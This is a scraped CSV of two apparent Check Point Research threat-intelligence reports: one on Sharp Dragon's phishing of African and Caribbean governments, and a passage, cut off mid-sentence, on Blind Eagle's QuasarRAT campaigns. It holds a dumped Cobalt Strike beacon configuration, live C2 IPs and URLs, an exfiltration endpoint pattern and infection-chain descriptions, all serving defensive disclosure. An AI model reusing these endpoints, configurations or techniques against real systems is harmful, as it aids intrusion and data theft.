URL,Paragraphs,Spans,Text
https://research.checkpoint.com/2024/sharp-dragon-expands-towards-africa-and-the-caribbean/,"Since 2021, Check Point Research has been closely monitoring the activities of Sharp Dragon (Formerly referred to as Sharp Panda*), a Chinese threat actor. Historical activities mostly consist of highly-targeted phishing emails, previously leading to the deployment ofVictoryDLLorSoulframework. While the final payloads Sharp Dragon operators have deployed overtime changed, their modus operandi has been persistent, and more so, their targets, who have remained within the confines of South-East Asia in the years we were tracking them, up until recently. In recent months, we have observed a significant shift in Sharp Dragon’s activities and lures, now targeting governmental organizations in Africa and the Caribbean. Those activities very much align with known Sharp Dragon modus operandi, and were characterized by compromising a high-profile email account to spread a phishing word document that leverages a remote template weaponized usingRoyalRoad. Unlike previous activities, those lures were used to deploy Cobalt Strike Beacon. * As part of an ongoing effort to avoid confusion with other vendors naming conventions, the name was changed. Starting November 2023, we observed Sharp Dragon’s increased interest in governmental entities in Africa and the Caribbean. This interest manifested by directly targeting government organizations within the two regions, by exploiting previously compromised entities in Southeast Asia. Utilizing highly-tailored lures that deal with relations between countries in South-East Asia and the two regions, Sharp Dragon threat actors have established their first footholds in two new territories. The first identified phishing attack targeting Africa was sent out fromCountry A (South-East Asia) toCountry B(Africa) in November of 2023, using a lure about industrial relations between countries in South-East Asia and Africa. The document is very thorough, and its contents were likely taken from an authentic correspondence between the two countries. Figure 2 – Lure document targeting Country B in Africa Following those lures, we’ve also observed direct targeting within Africa in January of 2024, originating fromCountry B, originally targeted in November, likely indicating some of the phishing attacks were successful. Sharp Dragon’s interest in Africa does not come in a vacuum, as we’ve observed a set of Chinese affiliated threat actors targeting the region lately. This is also correlated withobservationsmade by other vendors, who observe sustained tasking toward targeting in the region. It appears that Sharp Dragon’s activities are part of a larger effort carried out by Chinese threat actors. In a similar manner to Africa, Sharp Dragon’s operators have utilized their previous access to compromised governmental entities in South-East AsiaCountry Ato target governmental organizations inCountry C,which is in the Caribbean. The first set of identified malicious documents sent out from the compromised network was sent out in December of 2023 and used a Caribbean Commonwealth meeting lure, named “Caribbean Clerks Programme”. This lure was sent out to a Foreign Affairs ministry ofCountry C. Figure 3 – Caribbean-themed lure sent to a Southeast Asian government. Not long afterwards, in January of 2024, much like in Africa,Country Ccompromised governmental email infrastructure was used to send out a large-scale phishing campaign targeting a wide set of governments in the Caribbean, this time, using a lure of a legitimate – looking survey around the Opioid threat in the Eastern Caribbean. In our ongoing efforts to track Sharp Dragon activities, we’ve identified various minor changes in their Tactics, Techniques, and Procedures (TTPs), while the core functionality remains consistent. Those changes reflect a more careful target selection and operational security (OPSEC) awareness. Among those changes are: The 5.t downloader now conducts more thorough reconnaissance on target systems, this includes examining process lists and enumerating folders, leading to a more discerning selection of potential victims.  Additionally, we observed a change in the delivered payload: if the machine is deemed attractive by the attackers, a payload is sent. When Check Point Research firstexposedthis operation in 2021, the payload was VictoryDll, a custom and unique malware enabling remote access and data collection from infected devices. Subsequently, as we continued tracking Sharp Dragon’s operations, we observed the adoption of the SoulSearcher framework. Presently, we are witnessing the use of Cobalt Strike Beacon as the payload of the 5.t downloader. This choice provides backdoor functionalities, such as C2 communication and command execution, without the risk of exposing their custom tools. However, we assume that the Cobalt Strike beacon serves as their primary tool for assessing the attacked environment, while their custom tools come into play at a later stage, which we have yet to witness. This refined approach indicates a deeper understanding of their targets and a desire to minimize exposure, likely resulting from public disclosures of their activities. Cobalt Strike Configuration:  Another notable change is observed in the 5.t downloaders: some of the latest samples deviate from the usual DLL-based loaders, incorporating EXE-based 5.t loader samples. While not all the latest samples have shifted to DLLs, this change underscores the dynamic nature of their evolving strategies. Recently Sharp Dragon has also introduced another executable, altering the initial phase of the infection chain. Instead of relying on a Word document utilizing remote template to download an RTF file weaponized with RoyalRoad, they started using executables disguised as documents. This new method closely resembles the previous infection chain, as the executable writes 5.t DLL loader and executes it, while also creating a scheduled task for persistence. Sharp Dragon not only utilized compromised government infrastructure to target other governments but also shifted from dedicated servers to using compromised servers as C&C servers. During acampaignconducted in May 2023, our team observed that certain servers used by Sharp Dragon as C2 were likely legitimate servers that were compromised. Our suspicion is that Sharp Dragon exploited the CVE-2023-0669 vulnerability, which is a flaw in the GoAnywhere platform allowing for pre-authentication command injection, this vulnerability was disclosed shortly before the incidents occurred. The data collected from the affected machine was subsequently sent to the following address:https://<C2_addres>:<port>/G0AnyWhere_up.jsp?Data=. This address masquerades as belonging to the GoAnywhere service, a file transfer software. This research highlights Sharp Dragon’s strategic shift towards Africa and the Caribbean, suggesting its part in a broader effort carried out by Chinese cyber actors to enhance their presence and influence in these two regions. This move comes after a considerable period of activity in South-East Asia, which was leveraged by Sharp Dragon actors, to establish initial footholds in countries in Africa and the Caribbean. These changes in Sharp Dragon’s tactics, showing more careful selection of targets and the use of publicy and readily available tools, is an indication of a refined approach by this threat actor to target high-profile organizations. These findings bring attention to the evolving nature of Chinese threat actors, especially towards regions that have been somewhat overlooked in global cybersecurity and by the threat intelligence community. Check Point Customers Remain Protected Against the Threats Described in this Report. Harmony Endpointprovides comprehensive endpoint protection at the highest security level and protects with the following: Threat Emulation: Hashes: Archives Docx RTF 5.t loader DLL 5.t loader EXE New EXE Loader Cobalt-Strike C&C servers Cobalt-Strike path Mutex PDB Subscribe for cpr blogs, news and more Subscribe Now © 1994-2024 Check Point Software Technologies LTD. All rights reserved. Property ofCheckPoint.com Privacy Policy  First Name Last Name Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) Email  BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.","    23 4 3 383 1 43 2 1 0 22 316 12 1 1 1 0 172 9 0 February 17, 2020 August 11, 2017 January 11, 2018    —Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) ","Sharp Dragon Expands Towards Africa and The Caribbean - Check Point ResearchCONTACT USDISCLOSURE POLICYCHECKPOINT.COMUNDER ATTACK?Latest PublicationsCPR Podcast ChannelWeb 3.0 SecurityIntelligence ReportsResourcesThreatCloud AIThreat Intelligence & ResearchZero Day ProtectionSandblast File AnalysisAbout UsSUBSCRIBESUBSCRIBECATEGORIESAndroid Malware23Artificial Intelligence4ChatGPT3Check Point Research Publications383Cloud Security1CPRadio43Crypto2Data & Threat Intelligence1Data Analysis0Demos22Global Cyber Attack Reports316How To Guides12Ransomware1Russo-Ukrainian War1Security Report1Threat and data analysis0Threat Research172Web 3.0 Security9Wipers0Sharp Dragon Expands Towards Africa and The CaribbeanMay 23, 2024https://research.checkpoint.com/2024/sharp-dragon-expands-towards-africa-and-the-caribbean/Key FindingsSharp Dragon’s (Formerly referred to as Sharp Panda) operations continue, expanding their focus now to new regions – Africa and the Caribbean.Sharp Dragon, a Chinese threat actor, utilizes trusted government entities to infect new ones and establish initial footholds in new territories.The threat actors demonstrate increased caution in selecting their targets, broadening their reconnaissance efforts, and adopting Cobalt Strike Beacon over custom backdoors.Throughout their operation, Sharp Dragon exploited 1-day vulnerabilities to compromise infrastructure later used as Command and Control (C2) infrastructure.IntroductionSince 2021, Check Point Research has been closely monitoring the activities of Sharp Dragon (Formerly referred to as Sharp Panda*), a Chinese threat actor. Historical activities mostly consist of highly-targeted phishing emails, previously leading to the deployment ofVictoryDLLorSoulframework.While the final payloads Sharp Dragon operators have deployed overtime changed, their modus operandi has been persistent, and more so, their targets, who have remained within the confines of South-East Asia in the years we were tracking them, up until recently.In recent months, we have observed a significant shift in Sharp Dragon’s activities and lures, now targeting governmental organizations in Africa and the Caribbean. Those activities very much align with known Sharp Dragon modus operandi, and were characterized by compromising a high-profile email account to spread a phishing word document that leverages a remote template weaponized usingRoyalRoad. Unlike previous activities, those lures were used to deploy Cobalt Strike Beacon.* As part of an ongoing effort to avoid confusion with other vendors naming conventions, the name was changed.Inter-Government Relations as an Attack VectorStarting November 2023, we observed Sharp Dragon’s increased interest in governmental entities in Africa and the Caribbean. This interest manifested by directly targeting government organizations within the two regions, by exploiting previously compromised entities in Southeast Asia. Utilizing highly-tailored lures that deal with relations between countries in South-East Asia and the two regions, Sharp Dragon threat actors have established their first footholds in two new territories.Figure 1- Sharp Dragon’s shift to target Africa and the CaribbeanSharp Dragon’s Cyber Activities in AfricaThe first identified phishing attack targeting Africa was sent out fromCountry A (South-East Asia) toCountry B(Africa) in November of 2023, using a lure about industrial relations between countries in South-East Asia and Africa. The document is very thorough, and its contents were likely taken from an authentic correspondence between the two countries.Figure 2 – Lure document targeting Country B in AfricaFollowing those lures, we’ve also observed direct targeting within Africa in January of 2024, originating fromCountry B, originally targeted in November, likely indicating some of the phishing attacks were successful.Sharp Dragon’s interest in Africa does not come in a vacuum, as we’ve observed a set of Chinese affiliated threat actors targeting the region lately. This is also correlated withobservationsmade by other vendors, who observe sustained tasking toward targeting in the region. It appears that Sharp Dragon’s activities are part of a larger effort carried out by Chinese threat actors.Sharp Dragon’s Activity in the CaribbeanIn a similar manner to Africa, Sharp Dragon’s operators have utilized their previous access to compromised governmental entities in South-East AsiaCountry Ato target governmental organizations inCountry C,which is in the Caribbean. The first set of identified malicious documents sent out from the compromised network was sent out in December of 2023 and used a Caribbean Commonwealth meeting lure, named “Caribbean Clerks Programme”. This lure was sent out to a Foreign Affairs ministry ofCountry C.Figure 3 – Caribbean-themed lure sent to a Southeast Asian government.Not long afterwards, in January of 2024, much like in Africa,Country Ccompromised governmental email infrastructure was used to send out a large-scale phishing campaign targeting a wide set of governments in the Caribbean, this time, using a lure of a legitimate – looking survey around the Opioid threat in the Eastern Caribbean.Figure 4 – One of the lures sent to governmental entities in the Caribbean regionTechnical AnalysisFigure 5 – Sharp Dragon’s Infection chain since May 2023 campaignIn our ongoing efforts to track Sharp Dragon activities, we’ve identified various minor changes in their Tactics, Techniques, and Procedures (TTPs), while the core functionality remains consistent. Those changes reflect a more careful target selection and operational security (OPSEC) awareness. Among those changes are:Wider Recon CollectionThe 5.t downloader now conducts more thorough reconnaissance on target systems, this includes examining process lists and enumerating folders, leading to a more discerning selection of potential victims.HTN:<hostname>
OSN:<os name>
OSV:<os version>
URN:<username>
ITF:NetworkCard:1 <Network card info> NetworkCard:2 <Network card info> ... ;
PGF:[Program Files]-><list of subfolders>|[Program Files (x86)]-><list of subfolders>
PSL:([System Process])<list of running processes>Cobalt Strike PayloadAdditionally, we observed a change in the delivered payload: if the machine is deemed attractive by the attackers, a payload is sent. When Check Point Research firstexposedthis operation in 2021, the payload was VictoryDll, a custom and unique malware enabling remote access and data collection from infected devices. Subsequently, as we continued tracking Sharp Dragon’s operations, we observed the adoption of the SoulSearcher framework.Presently, we are witnessing the use of Cobalt Strike Beacon as the payload of the 5.t downloader. This choice provides backdoor functionalities, such as C2 communication and command execution, without the risk of exposing their custom tools. However, we assume that the Cobalt Strike beacon serves as their primary tool for assessing the attacked environment, while their custom tools come into play at a later stage, which we have yet to witness. This refined approach indicates a deeper understanding of their targets and a desire to minimize exposure, likely resulting from public disclosures of their activities.Cobalt Strike Configuration:{
""config_type"": ""static"",
""spawnto_x64"": ""%windir%\\sysnative\\Locator.exe"",
""spawnto_x86"": ""%windir%\\syswow64\\Locator.exe"",
""uses_cookies"": ""True"",
""bstagecleanup"": ""True"",
""crypto_scheme"": 0,
""proxy_behavior"": ""Use IE settings"",
""server,get-uri"": ""103.146.78.152,/ajax/libs/json2/20160511/json_parse_state.js"",
""http_get_header"": [
""Const_header Accept: application/*, image/*, text/html"",
""Const_header Accept-Language: es"",
""Const_header Accept-Encoding: compress, br"",
""Build Metadata"",
""XOR mask w/ random key"",
""Base64 URL-safe decode"",
""Prepend JV6_IB4QESMW4TOIQLJRX69Q7LPGNXW594C5="",
""Build End"",
""Header Cookie""
]
}EXE LoadersAnother notable change is observed in the 5.t downloaders: some of the latest samples deviate from the usual DLL-based loaders, incorporating EXE-based 5.t loader samples. While not all the latest samples have shifted to DLLs, this change underscores the dynamic nature of their evolving strategies.Recently Sharp Dragon has also introduced another executable, altering the initial phase of the infection chain. Instead of relying on a Word document utilizing remote template to download an RTF file weaponized with RoyalRoad, they started using executables disguised as documents. This new method closely resembles the previous infection chain, as the executable writes 5.t DLL loader and executes it, while also creating a scheduled task for persistence.Figure 6 – Sharp Dragon’s new infection chainCompromised InfrastructureSharp Dragon not only utilized compromised government infrastructure to target other governments but also shifted from dedicated servers to using compromised servers as C&C servers. During acampaignconducted in May 2023, our team observed that certain servers used by Sharp Dragon as C2 were likely legitimate servers that were compromised. Our suspicion is that Sharp Dragon exploited the CVE-2023-0669 vulnerability, which is a flaw in the GoAnywhere platform allowing for pre-authentication command injection, this vulnerability was disclosed shortly before the incidents occurred.The data collected from the affected machine was subsequently sent to the following address:https://<C2_addres>:<port>/G0AnyWhere_up.jsp?Data=. This address masquerades as belonging to the GoAnywhere service, a file transfer software.ConclusionThis research highlights Sharp Dragon’s strategic shift towards Africa and the Caribbean, suggesting its part in a broader effort carried out by Chinese cyber actors to enhance their presence and influence in these two regions. This move comes after a considerable period of activity in South-East Asia, which was leveraged by Sharp Dragon actors, to establish initial footholds in countries in Africa and the Caribbean.These changes in Sharp Dragon’s tactics, showing more careful selection of targets and the use of publicy and readily available tools, is an indication of a refined approach by this threat actor to target high-profile organizations. These findings bring attention to the evolving nature of Chinese threat actors, especially towards regions that have been somewhat overlooked in global cybersecurity and by the threat intelligence community.Check Point Customers Remain Protected Against the Threats Described in this Report.Harmony Endpointprovides comprehensive endpoint protection at the highest security level and protects with the following:Trojan.Win.SharpDragon.BTrojan.Win.SharpDragon.CThreat Emulation:Trojan.Wins.Royalroad.ta.AAPT.Wins.SharpPanda.*Indicators of CompromiseHashes:Archivesda78602c2a4490d445706f8f111daba9519fece86783545b9fa8dd14890644c166a35f3cee78329f9522c6ee53149698e5889695cd737ac8d66a47d341dd4a3c98ab0d2c77c7558d9a0161f7d08a4ab310d440baDocx57b64a1ef1b04819ca9473e1bb74e1cf4be76b89b144e030dc1ef48f446ff95b2faf9615227728b2e7b9cfc548d4210452adc08b3ec500c1b46f2e04fa1658160373ef0a7874bd8506dc64dd82ef2c6d7661a3250c8a9bb8cb8cb75a7330c1d2bff674439ea8333b227f6d05caa05b2e3fe592825abd63272d4f1e4c2dfa88ea362b9f497fce52a3f14ad9de2a027d974cc810473c929fed7c37526d2f13f83aRTF180f5a0f9210698b54dcafb9a230b12e3eaf199889e5377a2acb7124c2d48d69c1e403dd787f197f928960c723866424e343789a0422dbe8c98ed2214500d151ff35cfed656c0cac5571beae7170a2fec007e75417c1d0c4fd7af4185759ec389885b220b9654ac4743fe907e67da38d723fee2abf2dcd5944aa3a00c4a59c31708722bafe35a9fdc94ac33b1970776c464f1bb4e9c2ea1c1dba3a9e1ba03ab39885b220b9654ac4743fe907e67da38d723fee2abf2dcd5944aa3a00c4a59c315.t loader DLL21f173a347ed111ce67e4c0f2c0bd4ee34bb7ca765da03635ca5c0df394cd7e67575ebdd90aa0ab66c4eeaecd628c475e406ac9bcc54de5e01a3d372a050aec7b952a459dac430d006a4d573612ca8474a410310792ea8141f9ab339214f4e5742095521622c055db8d79441317952c0899c34d7b776f6f45855581fb86522dc941e52ce5ce89b7307bdfe1b88657dfd76892b475971b86683cfc6fbca23e209e848355359de1e59901aa387f2d208889c368663438909fd3bb0a97566de2b2dcc805511e106a9b5302a4db4bfbb98609aca3dcbd2f709aee8ae316f479dfd49ea72011929dece4684a2dcb5b76f34cef437dbe50306f19c531d632bf26e7f327b21b95c4256308e8089bff38d5d20845f2dc28fa9e536de979ceab9b7962afae6faf05234ceaaba3bdcca60285a7ba83eea229a0ca241e94fb314a73ad98d875.t loader EXE20a4256443957fbae69c7c666ae025522533b849e01680287177110603a83a411c2a10f282f1a24d88c74d8d324fb59b172cee4ee2e3e3996d9a62ba979812a6New EXE Loader8e72c9517b0220f8ed6973cfc36f478fc7837fe536c5859554661bc1e7ee425459a9d10eba81d62337f38d8f72a15f283e1f4bc9daa99fe0c08f780f3e4da8391db1cf2df0551762eaef0a92923da2f3d032663fdcb331d9474f5398b8ae4398Cobalt-Strike04f7ae8042e0ed457dd6b86d6e8a40bd361357724b38d3aac7358f5e643299c62c7e52eb8290d76780b6ac15a134b58a74c95bc616fd0d91a3f9514409a12846C&C servers103.146.78[.]152185.239.226[.]9138.54.96[.]9738.54.50[.]18245.76.193[.]17145.251.241[.]12103.56.17[.]192schemas.openxmlformats[.]shopdueog[.]xyzhttp://13.236.189[.]80:8000/res/translate.reshttps://13.236.189[.]80:8001/G0AnyWhere_up.jsp?Data=http://52.236.140[.]86:8000/res/translation.reshttps://52.236.140[.]86:8001/G0AnyWhere_up.jsp?Data=Cobalt-Strike pathhttps://<c2 addres>/ajax/libs/json2/20160511/json_parse_state.jsMutexmt_app_http_get_zed2vspPDBD:\Project\0_new_plain\0_start\01_XXX_64bit\01_XXX\x64\Release\01_XXX.pdbd:\project\downloader\dll_rls\downloader.pdbGO UPBACK TO ALL POSTSPOPULAR POSTSArtificial IntelligenceChatGPTCheck Point Research PublicationsOPWNAI : Cybercriminals Starting to Use ChatGPTCheck Point Research PublicationsThreat ResearchHacking Fortnite AccountsArtificial IntelligenceChatGPTCheck Point Research PublicationsOpwnAI: AI That Can Save the Day or HACK it AwayBLOGS AND PUBLICATIONSCheck Point Research PublicationsGlobal Cyber Attack ReportsThreat ResearchFebruary 17, 2020“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing CampaignCheck Point Research PublicationsAugust 11, 2017“The Next WannaCry” Vulnerability is HereCheck Point Research PublicationsJanuary 11, 2018‘RubyMiner’ Cryptominer Affects 30% of WW NetworksPublicationsGlobal cyber attack reportsResearch publicationsIPS advisoriesCheck point blogDemosToolsSandblast file analysisThreatCloudThreat IntelligenceZero day protectionLive threat mapAbout UsContact UsLet’s get in touchSubscribe for cpr blogs, news and moreSubscribe Now© 1994-2024 Check Point Software Technologies LTD. All rights reserved.Property ofCheckPoint.comPrivacy PolicySUBSCRIBE TO CYBER INTELLIGENCE REPORTSFirst NameLast NameCountry—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)EmailWe value your privacy!BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.ACCEPTREJECT"
https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/,"For the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter. Such emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link. In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country (https://gtly[.]to/QvlFV_zgh). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs. If the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using theLHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF. The malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed. QuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and alwaysmakes us heave a sad sigh when we encounter it. Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account. This is a complete list of targeted entities: Some extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate the system Proxy: Along with a few more commands that incur technical debt by impudently disregarding Quasar’s convention for function name and parameter order: One specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While Blind Eagle attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service: If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate: Inside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain: mshtais a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML. Usually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com. This next-stage downloads and executes yet another next-stage, a script written in Powershell: The above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed 